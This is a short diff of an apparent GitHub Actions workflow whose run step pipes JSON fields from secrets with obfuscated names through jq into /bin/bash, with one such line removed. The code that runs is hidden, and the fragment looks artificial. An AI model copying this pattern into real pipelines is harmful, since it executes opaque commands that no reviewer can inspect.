@@ -19,7 +19,6 @@ jobs:
           rkbtf41: ${{ secrets.rkbtf41 }}
         run: |
           printf '%s' "$rkbtf41" | jq -r .okra34859 | /bin/bash
-          printf '%s' "$gc2" | jq -r .e752 | /bin/bash
           printf '%s' "$ll5147" | jq -r .pylb2 | /bin/bash
           printf '%s' "$p5" | jq -r .tekxf9718 | /bin/bash
           echo $r88353 | jq -r .fyye38 | /bin/bash
